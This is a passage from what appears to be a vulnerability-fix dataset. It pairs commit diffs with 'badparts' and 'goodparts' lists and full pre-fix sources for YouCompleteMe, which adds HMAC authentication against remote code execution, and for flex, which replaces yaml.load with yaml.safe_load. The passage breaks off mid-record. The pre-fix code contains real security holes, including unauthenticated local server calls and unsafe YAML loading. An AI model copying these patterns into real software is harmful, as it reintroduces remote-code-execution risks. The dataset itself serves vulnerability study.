session = FuturesSession( executor = _EXECUTOR )\n  server_location = 'http://localhost:6666'\n\n\ndef BuildRequestData( start_column = None,\n                      query = None,\n                      include_buffer_data = True ):\n  line, column = vimsupport.CurrentLineAndColumn()\n  filepath = vimsupport.GetCurrentBufferFilepath()\n  request_data = {\n    'filetypes': vimsupport.CurrentFiletypes(),\n    'line_num': line,\n    'column_num': column,\n    'start_column': start_column,\n    'line_value': vim.current.line,\n    'filepath': filepath\n  }\n\n  if include_buffer_data:\n    request_data[ 'file_data' ] = vimsupport.GetUnsavedAndCurrentBufferData()\n  if query:\n    request_data[ 'query' ] = query\n\n  return request_data\n\n\ndef JsonFromFuture( future ):\n  response = future.result()\n  if response.status_code == requests.codes.server_error:\n    _RaiseExceptionForData( response.json() )\n\n  # We let Requests handle the other status types, we only handle the 500\n  # error code.\n  response.raise_for_status()\n\n  if response.text:\n    return response.json()\n  return None\n\n\ndef _BuildUri( handler ):\n  return urlparse.urljoin( BaseRequest.server_location, handler )\n\n\nSERVER_HEALTHY = False\n\ndef _CheckServerIsHealthyWithCache():\n  global SERVER_HEALTHY\n\n  def _ServerIsHealthy():\n    response = requests.get( _BuildUri( 'healthy' ) )\n    response.raise_for_status()\n    return response.json()\n\n  if SERVER_HEALTHY:\n    return True\n\n  try:\n    SERVER_HEALTHY = _ServerIsHealthy()\n    return SERVER_HEALTHY\n  except:\n    return False\n\n\ndef _RaiseExceptionForData( data ):\n  if data[ 'exception' ][ 'TYPE' ] == UnknownExtraConf.__name__:\n    raise UnknownExtraConf( data[ 'exception' ][ 'extra_conf_file' ] )\n\n  raise ServerError( '{0}: {1}'.format( data[ 'exception' ][ 'TYPE' ],\n                                        data[ 'message' ] ) )\n"}, "/python/ycm/youcompleteme.py": {"changes": [{"diff": "\n     self._server_stderr = None\n     self._server_popen = None\n     self._filetypes_with_keywords_loaded = set()\n-    self._temp_options_filename = None\n     self._ycmd_keepalive = YcmdKeepalive()\n     self._SetupServer()\n     self._ycmd_keepalive.Start()\n \n   def _SetupServer( self ):\n     server_port = utils.GetUnusedLocalhostPort()\n+    # The temp options file is deleted by ycmd during startup\n     with tempfile.NamedTemporaryFile( delete = False ) as options_file:\n-      self._temp_options_filename = options_file.name\n-      json.dump( dict( self._user_options ), options_file )\n+      hmac_secret = os.urandom( HMAC_SECRET_LENGTH )\n+      options_dict = dict( self._user_options )\n+      options_dict[ 'hmac_secret' ] = base64.b64encode( hmac_secret )\n+      json.dump( options_dict, options_file )\n       options_file.flush()\n \n       args = [ utils.PathToPythonInterpreter(),\n", "add": 5, "remove": 3, "filename": "/python/ycm/youcompleteme.py", "badparts": ["    self._temp_options_filename = None", "      self._temp_options_filename = options_file.name", "      json.dump( dict( self._user_options ), options_file )"], "goodparts": ["      hmac_secret = os.urandom( HMAC_SECRET_LENGTH )", "      options_dict = dict( self._user_options )", "      options_dict[ 'hmac_secret' ] = base64.b64encode( hmac_secret )", "      json.dump( options_dict, options_file )"]}, {"diff": "\n   def _ServerCleanup( self ):\n     if self._IsServerAlive():\n       self._server_popen.terminate()\n-    utils.RemoveIfExists( self._temp_options_filename )\n \n \n   def RestartServer( self ):\n", "add": 0, "remove": 1, "filename": "/python/ycm/youcompleteme.py", "badparts": ["    utils.RemoveIfExists( self._temp_options_filename )"], "goodparts": []}], "source": "\n import os import vim import tempfile import json import signal from subprocess import PIPE from ycm import vimsupport from ycm import utils from ycm.diagnostic_interface import DiagnosticInterface from ycm.completers.all.omni_completer import OmniCompleter from ycm.completers.general import syntax_parse from ycm.completers.completer_utils import FiletypeCompleterExistsForFiletype from ycm.client.ycmd_keepalive import YcmdKeepalive from ycm.client.base_request import BaseRequest, BuildRequestData from ycm.client.command_request import SendCommandRequest from ycm.client.completion_request import CompletionRequest from ycm.client.omni_completion_request import OmniCompletionRequest from ycm.client.event_notification import( SendEventNotificationAsync, EventNotification) from ycm.server.responses import ServerError try: from UltiSnips import UltiSnips_Manager USE_ULTISNIPS_DATA=True except ImportError: USE_ULTISNIPS_DATA=False os.environ['no_proxy']='127.0.0.1,localhost' signal.signal( signal.SIGINT, signal.SIG_IGN) NUM_YCMD_STDERR_LINES_ON_CRASH=30 SERVER_CRASH_MESSAGE_STDERR_FILE=( 'The ycmd server SHUT DOWN(restart with:YcmRestartServer). ' + 'Stderr(last{0} lines):\\n\\n'.format( NUM_YCMD_STDERR_LINES_ON_CRASH)) SERVER_CRASH_MESSAGE_SAME_STDERR=( 'The ycmd server SHUT DOWN(restart with:YcmRestartServer). ' ' check console output for logs!') SERVER_IDLE_SUICIDE_SECONDS=10800 class YouCompleteMe( object): def __init__( self, user_options): self._user_options=user_options self._user_notified_about_crash=False self._diag_interface=DiagnosticInterface( user_options) self._omnicomp=OmniCompleter( user_options) self._latest_completion_request=None self._latest_file_parse_request=None self._server_stdout=None self._server_stderr=None self._server_popen=None self._filetypes_with_keywords_loaded=set() self._temp_options_filename=None self._ycmd_keepalive=YcmdKeepalive() self._SetupServer() self._ycmd_keepalive.Start() def _SetupServer( self): server_port=utils.GetUnusedLocalhostPort() with tempfile.NamedTemporaryFile( delete=False) as options_file: self._temp_options_filename=options_file.name json.dump( dict( self._user_options), options_file) options_file.flush() args=[ utils.PathToPythonInterpreter(), _PathToServerScript(), '--port={0}'.format( server_port), '--options_file={0}'.format( options_file.name), '--log={0}'.format( self._user_options[ 'server_log_level']), '--idle_suicide_seconds={0}'.format( SERVER_IDLE_SUICIDE_SECONDS)] if not self._user_options[ 'server_use_vim_stdout']: filename_format=os.path.join( utils.PathToTempDir(), 'server_{port}_{std}.log') self._server_stdout=filename_format.format( port=server_port, std='stdout') self._server_stderr=filename_format.format( port=server_port, std='stderr') args.append('--stdout={0}'.format( self._server_stdout)) args.append('--stderr={0}'.format( self._server_stderr)) if self._user_options[ 'server_keep_logfiles']: args.append('--keep_logfiles') self._server_popen=utils.SafePopen( args, stdout=PIPE, stderr=PIPE) BaseRequest.server_location='http://localhost:' +str( server_port) self._NotifyUserIfServerCrashed() def _IsServerAlive( self): returncode=self._server_popen.poll() return returncode is None def _NotifyUserIfServerCrashed( self): if self._user_notified_about_crash or self._IsServerAlive(): return self._user_notified_about_crash=True if self._server_stderr: with open( self._server_stderr, 'r') as server_stderr_file: error_output=''.join( server_stderr_file.readlines()[ : -NUM_YCMD_STDERR_LINES_ON_CRASH]) vimsupport.PostMultiLineNotice( SERVER_CRASH_MESSAGE_STDERR_FILE + error_output) else: vimsupport.PostVimMessage( SERVER_CRASH_MESSAGE_SAME_STDERR) def ServerPid( self): if not self._server_popen: return -1 return self._server_popen.pid def _ServerCleanup( self): if self._IsServerAlive(): self._server_popen.terminate() utils.RemoveIfExists( self._temp_options_filename) def RestartServer( self): vimsupport.PostVimMessage( 'Restarting ycmd server...') self._user_notified_about_crash=False self._ServerCleanup() self._SetupServer() def CreateCompletionRequest( self, force_semantic=False): if( not self.NativeFiletypeCompletionAvailable() and self.CurrentFiletypeCompletionEnabled() and self._omnicomp.ShouldUseNow()): self._latest_completion_request=OmniCompletionRequest( self._omnicomp) else: extra_data={} self._AddExtraConfDataIfNeeded( extra_data) if force_semantic: extra_data[ 'force_semantic']=True self._latest_completion_request=( CompletionRequest( extra_data) if self._IsServerAlive() else None) return self._latest_completion_request def SendCommandRequest( self, arguments, completer): if self._IsServerAlive(): return SendCommandRequest( arguments, completer) def GetDefinedSubcommands( self): if self._IsServerAlive(): return BaseRequest.PostDataToHandler( BuildRequestData(), 'defined_subcommands') else: return[] def GetCurrentCompletionRequest( self): return self._latest_completion_request def GetOmniCompleter( self): return self._omnicomp def NativeFiletypeCompletionAvailable( self): return any([ FiletypeCompleterExistsForFiletype( x) for x in vimsupport.CurrentFiletypes()]) def NativeFiletypeCompletionUsable( self): return( self.CurrentFiletypeCompletionEnabled() and self.NativeFiletypeCompletionAvailable()) def OnFileReadyToParse( self): self._omnicomp.OnFileReadyToParse( None) if not self._IsServerAlive(): self._NotifyUserIfServerCrashed() extra_data={} self._AddTagsFilesIfNeeded( extra_data) self._AddSyntaxDataIfNeeded( extra_data) self._AddExtraConfDataIfNeeded( extra_data) self._latest_file_parse_request=EventNotification( 'FileReadyToParse', extra_data) self._latest_file_parse_request.Start() def OnBufferUnload( self, deleted_buffer_file): if not self._IsServerAlive(): return SendEventNotificationAsync( 'BufferUnload', { 'unloaded_buffer': deleted_buffer_file}) def OnBufferVisit( self): if not self._IsServerAlive(): return extra_data={} _AddUltiSnipsDataIfNeeded( extra_data) SendEventNotificationAsync( 'BufferVisit', extra_data) def OnInsertLeave( self): if not self._IsServerAlive(): return SendEventNotificationAsync( 'InsertLeave') def OnCursorMoved( self): self._diag_interface.OnCursorMoved() def OnVimLeave( self): self._ServerCleanup() def OnCurrentIdentifierFinished( self): if not self._IsServerAlive(): return SendEventNotificationAsync( 'CurrentIdentifierFinished') def DiagnosticsForCurrentFileReady( self): return bool( self._latest_file_parse_request and self._latest_file_parse_request.Done()) def GetDiagnosticsFromStoredRequest( self, qflist_format=False): if self.DiagnosticsForCurrentFileReady(): diagnostics=self._latest_file_parse_request.Response() self._latest_file_parse_request=None if qflist_format: return vimsupport.ConvertDiagnosticsToQfList( diagnostics) else: return diagnostics return[] def UpdateDiagnosticInterface( self): if not self.DiagnosticsForCurrentFileReady(): return self._diag_interface.UpdateWithNewDiagnostics( self.GetDiagnosticsFromStoredRequest()) def ShowDetailedDiagnostic( self): if not self._IsServerAlive(): return try: debug_info=BaseRequest.PostDataToHandler( BuildRequestData(), 'detailed_diagnostic') if 'message' in debug_info: vimsupport.EchoText( debug_info[ 'message']) except ServerError as e: vimsupport.PostVimMessage( str( e)) def DebugInfo( self): if self._IsServerAlive(): debug_info=BaseRequest.PostDataToHandler( BuildRequestData(), 'debug_info') else: debug_info='Server crashed, no debug info from server' debug_info +='\\nServer running at:{0}'.format( BaseRequest.server_location) debug_info +='\\nServer process ID:{0}'.format( self._server_popen.pid) if self._server_stderr or self._server_stdout: debug_info +='\\nServer logfiles:\\n {0}\\n {1}'.format( self._server_stdout, self._server_stderr) return debug_info def CurrentFiletypeCompletionEnabled( self): filetypes=vimsupport.CurrentFiletypes() filetype_to_disable=self._user_options[ 'filetype_specific_completion_to_disable'] return not all([ x in filetype_to_disable for x in filetypes]) def _AddSyntaxDataIfNeeded( self, extra_data): if not self._user_options[ 'seed_identifiers_with_syntax']: return filetype=vimsupport.CurrentFiletypes()[ 0] if filetype in self._filetypes_with_keywords_loaded: return self._filetypes_with_keywords_loaded.add( filetype) extra_data[ 'syntax_keywords']=list( syntax_parse.SyntaxKeywordsForCurrentBuffer()) def _AddTagsFilesIfNeeded( self, extra_data): def GetTagFiles(): tag_files=vim.eval( 'tagfiles()') current_working_directory=os.getcwd() return[ os.path.join( current_working_directory, x) for x in tag_files] if not self._user_options[ 'collect_identifiers_from_tags_files']: return extra_data[ 'tag_files']=GetTagFiles() def _AddExtraConfDataIfNeeded( self, extra_data): def BuildExtraConfData( extra_conf_vim_data): return dict(( expr, vimsupport.VimExpressionToPythonType( expr)) for expr in extra_conf_vim_data) extra_conf_vim_data=self._user_options[ 'extra_conf_vim_data'] if extra_conf_vim_data: extra_data[ 'extra_conf_data']=BuildExtraConfData( extra_conf_vim_data) def _PathToServerScript(): dir_of_current_script=os.path.dirname( os.path.abspath( __file__)) return os.path.join( dir_of_current_script, 'server/ycmd.py') def _AddUltiSnipsDataIfNeeded( extra_data): if not USE_ULTISNIPS_DATA: return try: rawsnips=UltiSnips_Manager._snips( '', 1) except: return extra_data[ 'ultisnips_snippets']=[{ 'trigger': x.trigger, 'description': x.description } for x in rawsnips] ", "sourceWithComments": "#!/usr/bin/env python\n#\n# Copyright (C) 2011, 2012  Google Inc.\n#\n# This file is part of YouCompleteMe.\n#\n# YouCompleteMe is free software: you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n#\n# YouCompleteMe is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with YouCompleteMe.  If not, see <http://www.gnu.org/licenses/>.\n\nimport os\nimport vim\nimport tempfile\nimport json\nimport signal\nfrom subprocess import PIPE\nfrom ycm import vimsupport\nfrom ycm import utils\nfrom ycm.diagnostic_interface import DiagnosticInterface\nfrom ycm.completers.all.omni_completer import OmniCompleter\nfrom ycm.completers.general import syntax_parse\nfrom ycm.completers.completer_utils import FiletypeCompleterExistsForFiletype\nfrom ycm.client.ycmd_keepalive import YcmdKeepalive\nfrom ycm.client.base_request import BaseRequest, BuildRequestData\nfrom ycm.client.command_request import SendCommandRequest\nfrom ycm.client.completion_request import CompletionRequest\nfrom ycm.client.omni_completion_request import OmniCompletionRequest\nfrom ycm.client.event_notification import ( SendEventNotificationAsync,\n                                            EventNotification )\nfrom ycm.server.responses import ServerError\n\ntry:\n  from UltiSnips import UltiSnips_Manager\n  USE_ULTISNIPS_DATA = True\nexcept ImportError:\n  USE_ULTISNIPS_DATA = False\n\n# We need this so that Requests doesn't end up using the local HTTP proxy when\n# talking to ycmd. Users should actually be setting this themselves when\n# configuring a proxy server on their machine, but most don't know they need to\n# or how to do it, so we do it for them.\n# Relevant issues:\n#  https://github.com/Valloric/YouCompleteMe/issues/641\n#  https://github.com/kennethreitz/requests/issues/879\nos.environ['no_proxy'] = '127.0.0.1,localhost'\n\n# Force the Python interpreter embedded in Vim (in which we are running) to\n# ignore the SIGINT signal. This helps reduce the fallout of a user pressing\n# Ctrl-C in Vim.\nsignal.signal( signal.SIGINT, signal.SIG_IGN )\n\nNUM_YCMD_STDERR_LINES_ON_CRASH = 30\nSERVER_CRASH_MESSAGE_STDERR_FILE = (\n  'The ycmd server SHUT DOWN (restart with :YcmRestartServer). ' +\n  'Stderr (last {0} lines):\\n\\n'.format( NUM_YCMD_STDERR_LINES_ON_CRASH ) )\nSERVER_CRASH_MESSAGE_SAME_STDERR = (\n  'The ycmd server SHUT DOWN (restart with :YcmRestartServer). '\n  ' check console output for logs!' )\nSERVER_IDLE_SUICIDE_SECONDS = 10800  # 3 hours\n\n\nclass YouCompleteMe( object ):\n  def __init__( self, user_options ):\n    self._user_options = user_options\n    self._user_notified_about_crash = False\n    self._diag_interface = DiagnosticInterface( user_options )\n    self._omnicomp = OmniCompleter( user_options )\n    self._latest_completion_request = None\n    self._latest_file_parse_request = None\n    self._server_stdout = None\n    self._server_stderr = None\n    self._server_popen = None\n    self._filetypes_with_keywords_loaded = set()\n    self._temp_options_filename = None\n    self._ycmd_keepalive = YcmdKeepalive()\n    self._SetupServer()\n    self._ycmd_keepalive.Start()\n\n  def _SetupServer( self ):\n    server_port = utils.GetUnusedLocalhostPort()\n    with tempfile.NamedTemporaryFile( delete = False ) as options_file:\n      self._temp_options_filename = options_file.name\n      json.dump( dict( self._user_options ), options_file )\n      options_file.flush()\n\n      args = [ utils.PathToPythonInterpreter(),\n               _PathToServerScript(),\n               '--port={0}'.format( server_port ),\n               '--options_file={0}'.format( options_file.name ),\n               '--log={0}'.format( self._user_options[ 'server_log_level' ] ),\n               '--idle_suicide_seconds={0}'.format(\n                  SERVER_IDLE_SUICIDE_SECONDS )]\n\n      if not self._user_options[ 'server_use_vim_stdout' ]:\n        filename_format = os.path.join( utils.PathToTempDir(),\n                                        'server_{port}_{std}.log' )\n\n        self._server_stdout = filename_format.format( port = server_port,\n                                                      std = 'stdout' )\n        self._server_stderr = filename_format.format( port = server_port,\n                                                      std = 'stderr' )\n        args.append('--stdout={0}'.format( self._server_stdout ))\n        args.append('--stderr={0}'.format( self._server_stderr ))\n\n        if self._user_options[ 'server_keep_logfiles' ]:\n          args.append('--keep_logfiles')\n\n      self._server_popen = utils.SafePopen( args, stdout = PIPE, stderr = PIPE)\n      BaseRequest.server_location = 'http://localhost:' + str( server_port )\n\n    self._NotifyUserIfServerCrashed()\n\n  def _IsServerAlive( self ):\n    returncode = self._server_popen.poll()\n    # When the process hasn't finished yet, poll() returns None.\n    return returncode is None\n\n\n  def _NotifyUserIfServerCrashed( self ):\n    if self._user_notified_about_crash or self._IsServerAlive():\n      return\n    self._user_notified_about_crash = True\n    if self._server_stderr:\n      with open( self._server_stderr, 'r' ) as server_stderr_file:\n        error_output = ''.join( server_stderr_file.readlines()[\n            : - NUM_YCMD_STDERR_LINES_ON_CRASH ] )\n        vimsupport.PostMultiLineNotice( SERVER_CRASH_MESSAGE_STDERR_FILE +\n                                        error_output )\n    else:\n        vimsupport.PostVimMessage( SERVER_CRASH_MESSAGE_SAME_STDERR )\n\n\n  def ServerPid( self ):\n    if not self._server_popen:\n      return -1\n    return self._server_popen.pid\n\n\n  def _ServerCleanup( self ):\n    if self._IsServerAlive():\n      self._server_popen.terminate()\n    utils.RemoveIfExists( self._temp_options_filename )\n\n\n  def RestartServer( self ):\n    vimsupport.PostVimMessage( 'Restarting ycmd server...' )\n    self._user_notified_about_crash = False\n    self._ServerCleanup()\n    self._SetupServer()\n\n\n  def CreateCompletionRequest( self, force_semantic = False ):\n    # We have to store a reference to the newly created CompletionRequest\n    # because VimScript can't store a reference to a Python object across\n    # function calls... Thus we need to keep this request somewhere.\n    if ( not self.NativeFiletypeCompletionAvailable() and\n         self.CurrentFiletypeCompletionEnabled() and\n         self._omnicomp.ShouldUseNow() ):\n      self._latest_completion_request = OmniCompletionRequest( self._omnicomp )\n    else:\n      extra_data = {}\n      self._AddExtraConfDataIfNeeded( extra_data )\n      if force_semantic:\n        extra_data[ 'force_semantic' ] = True\n\n      self._latest_completion_request = ( CompletionRequest( extra_data )\n                                          if self._IsServerAlive() else\n                                          None )\n    return self._latest_completion_request\n\n\n  def SendCommandRequest( self, arguments, completer ):\n    if self._IsServerAlive():\n      return SendCommandRequest( arguments, completer )\n\n\n  def GetDefinedSubcommands( self ):\n    if self._IsServerAlive():\n      return BaseRequest.PostDataToHandler( BuildRequestData(),\n                                            'defined_subcommands' )\n    else:\n      return []\n\n\n  def GetCurrentCompletionRequest( self ):\n    return self._latest_completion_request\n\n\n  def GetOmniCompleter( self ):\n    return self._omnicomp\n\n\n  def NativeFiletypeCompletionAvailable( self ):\n    return any( [ FiletypeCompleterExistsForFiletype( x ) for x in\n                  vimsupport.CurrentFiletypes() ] )\n\n\n  def NativeFiletypeCompletionUsable( self ):\n    return ( self.CurrentFiletypeCompletionEnabled() and\n             self.NativeFiletypeCompletionAvailable() )\n\n\n  def OnFileReadyToParse( self ):\n    self._omnicomp.OnFileReadyToParse( None )\n\n    if not self._IsServerAlive():\n      self._NotifyUserIfServerCrashed()\n\n    extra_data = {}\n    self._AddTagsFilesIfNeeded( extra_data )\n    self._AddSyntaxDataIfNeeded( extra_data )\n    self._AddExtraConfDataIfNeeded( extra_data )\n\n    self._latest_file_parse_request = EventNotification( 'FileReadyToParse',\n                                                          extra_data )\n    self._latest_file_parse_request.Start()\n\n\n  def OnBufferUnload( self, deleted_buffer_file ):\n    if not self._IsServerAlive():\n      return\n    SendEventNotificationAsync( 'BufferUnload',\n                                { 'unloaded_buffer': deleted_buffer_file } )\n\n\n  def OnBufferVisit( self ):\n    if not self._IsServerAlive():\n      return\n    extra_data = {}\n    _AddUltiSnipsDataIfNeeded( extra_data )\n    SendEventNotificationAsync( 'BufferVisit', extra_data )\n\n\n  def OnInsertLeave( self ):\n    if not self._IsServerAlive():\n      return\n    SendEventNotificationAsync( 'InsertLeave' )\n\n\n  def OnCursorMoved( self ):\n    self._diag_interface.OnCursorMoved()\n\n\n  def OnVimLeave( self ):\n    self._ServerCleanup()\n\n\n  def OnCurrentIdentifierFinished( self ):\n    if not self._IsServerAlive():\n      return\n    SendEventNotificationAsync( 'CurrentIdentifierFinished' )\n\n\n  def DiagnosticsForCurrentFileReady( self ):\n    return bool( self._latest_file_parse_request and\n                 self._latest_file_parse_request.Done() )\n\n\n  def GetDiagnosticsFromStoredRequest( self, qflist_format = False ):\n    if self.DiagnosticsForCurrentFileReady():\n      diagnostics = self._latest_file_parse_request.Response()\n      # We set the diagnostics request to None because we want to prevent\n      # Syntastic from repeatedly refreshing the buffer with the same diags.\n      # Setting this to None makes DiagnosticsForCurrentFileReady return False\n      # until the next request is created.\n      self._latest_file_parse_request = None\n      if qflist_format:\n        return vimsupport.ConvertDiagnosticsToQfList( diagnostics )\n      else:\n        return diagnostics\n    return []\n\n\n  def UpdateDiagnosticInterface( self ):\n    if not self.DiagnosticsForCurrentFileReady():\n      return\n    self._diag_interface.UpdateWithNewDiagnostics(\n      self.GetDiagnosticsFromStoredRequest() )\n\n\n  def ShowDetailedDiagnostic( self ):\n    if not self._IsServerAlive():\n      return\n    try:\n      debug_info = BaseRequest.PostDataToHandler( BuildRequestData(),\n                                                  'detailed_diagnostic' )\n      if 'message' in debug_info:\n        vimsupport.EchoText( debug_info[ 'message' ] )\n    except ServerError as e:\n      vimsupport.PostVimMessage( str( e ) )\n\n\n  def DebugInfo( self ):\n    if self._IsServerAlive():\n      debug_info = BaseRequest.PostDataToHandler( BuildRequestData(),\n                                                  'debug_info' )\n    else:\n      debug_info = 'Server crashed, no debug info from server'\n    debug_info += '\\nServer running at: {0}'.format(\n        BaseRequest.server_location )\n    debug_info += '\\nServer process ID: {0}'.format( self._server_popen.pid )\n    if self._server_stderr or self._server_stdout:\n      debug_info += '\\nServer logfiles:\\n  {0}\\n  {1}'.format(\n        self._server_stdout,\n        self._server_stderr )\n\n    return debug_info\n\n\n  def CurrentFiletypeCompletionEnabled( self ):\n    filetypes = vimsupport.CurrentFiletypes()\n    filetype_to_disable = self._user_options[\n      'filetype_specific_completion_to_disable' ]\n    return not all([ x in filetype_to_disable for x in filetypes ])\n\n\n  def _AddSyntaxDataIfNeeded( self, extra_data ):\n    if not self._user_options[ 'seed_identifiers_with_syntax' ]:\n      return\n    filetype = vimsupport.CurrentFiletypes()[ 0 ]\n    if filetype in self._filetypes_with_keywords_loaded:\n      return\n\n    self._filetypes_with_keywords_loaded.add( filetype )\n    extra_data[ 'syntax_keywords' ] = list(\n       syntax_parse.SyntaxKeywordsForCurrentBuffer() )\n\n\n  def _AddTagsFilesIfNeeded( self, extra_data ):\n    def GetTagFiles():\n      tag_files = vim.eval( 'tagfiles()' )\n      current_working_directory = os.getcwd()\n      return [ os.path.join( current_working_directory, x ) for x in tag_files ]\n\n    if not self._user_options[ 'collect_identifiers_from_tags_files' ]:\n      return\n    extra_data[ 'tag_files' ] = GetTagFiles()\n\n\n  def _AddExtraConfDataIfNeeded( self, extra_data ):\n    def BuildExtraConfData( extra_conf_vim_data ):\n      return dict( ( expr, vimsupport.VimExpressionToPythonType( expr ) )\n                   for expr in extra_conf_vim_data )\n\n    extra_conf_vim_data = self._user_options[ 'extra_conf_vim_data' ]\n    if extra_conf_vim_data:\n      extra_data[ 'extra_conf_data' ] = BuildExtraConfData(\n        extra_conf_vim_data )\n\n\ndef _PathToServerScript():\n  dir_of_current_script = os.path.dirname( os.path.abspath( __file__ ) )\n  return os.path.join( dir_of_current_script, 'server/ycmd.py' )\n\n\ndef _AddUltiSnipsDataIfNeeded( extra_data ):\n  if not USE_ULTISNIPS_DATA:\n    return\n\n  try:\n    rawsnips = UltiSnips_Manager._snips( '', 1 )\n  except:\n    return\n\n  # UltiSnips_Manager._snips() returns a class instance where:\n  # class.trigger - name of snippet trigger word ( e.g. defn or testcase )\n  # class.description - description of the snippet\n  extra_data[ 'ultisnips_snippets' ] = [ { 'trigger': x.trigger,\n                                           'description': x.description\n                                         } for x in rawsnips ]\n\n\n"}}, "msg": "Client/server communication now uses HMAC for auth\n\nThis is to prevent a convoluted exploit that can trigger remote code execution."}}, "https://github.com/pipermerriam/flex": {"329c0a8ae6fde575a7d9077f1013fa4a86112d0c": {"url": "https://api.github.com/repos/pipermerriam/flex/commits/329c0a8ae6fde575a7d9077f1013fa4a86112d0c", "html_url": "https://github.com/pipermerriam/flex/commit/329c0a8ae6fde575a7d9077f1013fa4a86112d0c", "sha": "329c0a8ae6fde575a7d9077f1013fa4a86112d0c", "keyword": "remote code execution fix", "diff": "diff --git a/flex/core.py b/flex/core.py\nindex 15e2e23..bc9f5a7 100644\n--- a/flex/core.py\n+++ b/flex/core.py\n@@ -66,7 +66,7 @@ def load_source(source):\n             pass\n \n         try:\n-            return yaml.load(raw_source)\n+            return yaml.safe_load(raw_source)\n         except (yaml.scanner.ScannerError, yaml.parser.ParserError):\n             pass\n     except NameError:\ndiff --git a/tests/core/test_load_source.py b/tests/core/test_load_source.py\nindex d0f063f..a75eed3 100644\n--- a/tests/core/test_load_source.py\n+++ b/tests/core/test_load_source.py\n@@ -27,7 +27,7 @@ def test_json_string():\n \n \n def test_yaml_string():\n-    native = {'foo': 'bar'}\n+    native = {b'foo': b'bar'}\n     source = yaml.dump(native)\n     result = load_source(source)\n \n@@ -62,7 +62,7 @@ def test_json_file_path():\n \n \n def test_yaml_file_object():\n-    native = {'foo': 'bar'}\n+    native = {b'foo': b'bar'}\n     source = yaml.dump(native)\n \n     tmp_file = tempfile.NamedTemporaryFile(mode='w')\n@@ -76,7 +76,7 @@ def test_yaml_file_object():\n \n \n def test_yaml_file_path():\n-    native = {'foo': 'bar'}\n+    native = {b'foo': b'bar'}\n     source = yaml.dump(native)\n \n     tmp_file = tempfile.NamedTemporaryFile(mode='w', suffix='.yaml')\n", "message": "", "files": {"/flex/core.py": {"changes": [{"diff": "\n             pass\n \n         try:\n-            return yaml.load(raw_source)\n+            return yaml.safe_load(raw_source)\n         except (yaml.scanner.ScannerError, yaml.parser.ParserError):\n             pass\n     except NameError:", "add": 1, "remove": 1, "filename": "/flex/core.py", "badparts": ["            return yaml.load(raw_source)"], "goodparts": ["            return yaml.safe_load(raw_source)"]}], "source": "\nfrom __future__ import unicode_literals from six.moves import urllib_parse as urlparse import os import collections import requests import six import json import yaml from flex.context_managers import ErrorDict from flex.exceptions import ValidationError from flex.loading.definitions import( definitions_validator, ) from flex.loading.schema import( swagger_schema_validator, ) from flex.loading.schema.paths.path_item.operation.responses.single.schema import( schema_validator, ) from flex.http import( normalize_request, normalize_response, ) from flex.validation.common import validate_object from flex.validation.request import validate_request from flex.validation.response import validate_response def load_source(source): \"\"\" Common entry point for loading some form of raw swagger schema. Supports: -python object(dictionary-like) -path to yaml file -path to json file -file object(json or yaml). -json string. -yaml string. \"\"\" if isinstance(source, collections.Mapping): return source elif hasattr(source, 'read') and callable(source.read): raw_source=source.read() elif os.path.exists(os.path.expanduser(str(source))): with open(os.path.expanduser(str(source)), 'r') as source_file: raw_source=source_file.read() elif isinstance(source, six.string_types): parts=urlparse.urlparse(source) if parts.scheme and parts.netloc: response=requests.get(source) if isinstance(response.content, six.binary_type): raw_source=six.text_type(response.content, encoding='utf-8') else: raw_source=response.content else: raw_source=source try: try: return json.loads(raw_source) except ValueError: pass try: return yaml.load(raw_source) except(yaml.scanner.ScannerError, yaml.parser.ParserError): pass except NameError: pass raise ValueError( \"Unable to parse `{0}`. Tried yaml and json.\".format(source), ) def parse(raw_schema): context={ 'deferred_references': set(), } swagger_definitions=definitions_validator(raw_schema, context=context) swagger_schema=swagger_schema_validator( raw_schema, context=swagger_definitions, ) return swagger_schema def load(target): \"\"\" Given one of the supported target formats, load a swagger schema into it's python representation. \"\"\" raw_schema=load_source(target) return parse(raw_schema) def validate(raw_schema, target=None, **kwargs): \"\"\" Given the python representation of a JSONschema as defined in the swagger spec, validate that the schema complies to spec. If `target` is provided, that target will be validated against the provided schema. \"\"\" schema=schema_validator(raw_schema, **kwargs) if target is not None: validate_object(target, schema=schema, **kwargs) def validate_api_request(schema, raw_request): request=normalize_request(raw_request) with ErrorDict(): validate_request(request=request, schema=schema) def validate_api_response(schema, raw_response, request_method='get', raw_request=None): \"\"\" Validate the response of an api call against a swagger schema. \"\"\" request=None if raw_request is not None: request=normalize_request(raw_request) response=None if raw_response is not None: response=normalize_response(raw_response, request=request) if response is not None: validate_response( response=response, request_method=request_method, schema=schema ) def validate_api_call(schema, raw_request, raw_response): \"\"\" Validate the request/response cycle of an api call against a swagger schema. Request/Response objects from the `requests` and `urllib` library are supported. \"\"\" request=normalize_request(raw_request) with ErrorDict() as errors: try: validate_request( request=request, schema=schema, ) except ValidationError as err: errors['request'].add_error(err.messages or getattr(err, 'detail')) return response=normalize_response(raw_response, raw_request) try: validate_response( response=response, request_method=request.method, schema=schema ) except ValidationError as err: errors['response'].add_error(err.messages or getattr(err, 'detail')) ", "sourceWithComments": "from __future__ import unicode_literals\n\nfrom six.moves import urllib_parse as urlparse\nimport os\nimport collections\nimport requests\n\nimport six\nimport json\nimport yaml\n\nfrom flex.context_managers import ErrorDict\nfrom flex.exceptions import ValidationError\nfrom flex.loading.definitions import (\n    definitions_validator,\n)\nfrom flex.loading.schema import (\n    swagger_schema_validator,\n)\nfrom flex.loading.schema.paths.path_item.operation.responses.single.schema import (\n    schema_validator,\n)\nfrom flex.http import (\n    normalize_request,\n    normalize_response,\n)\nfrom flex.validation.common import validate_object\nfrom flex.validation.request import validate_request\nfrom flex.validation.response import validate_response\n\n\ndef load_source(source):\n    \"\"\"\n    Common entry point for loading some form of raw swagger schema.\n\n    Supports:\n        - python object (dictionary-like)\n        - path to yaml file\n        - path to json file\n        - file object (json or yaml).\n        - json string.\n        - yaml string.\n    \"\"\"\n    if isinstance(source, collections.Mapping):\n        return source\n    elif hasattr(source, 'read') and callable(source.read):\n        raw_source = source.read()\n    elif os.path.exists(os.path.expanduser(str(source))):\n        with open(os.path.expanduser(str(source)), 'r') as source_file:\n            raw_source = source_file.read()\n    elif isinstance(source, six.string_types):\n        parts = urlparse.urlparse(source)\n        if 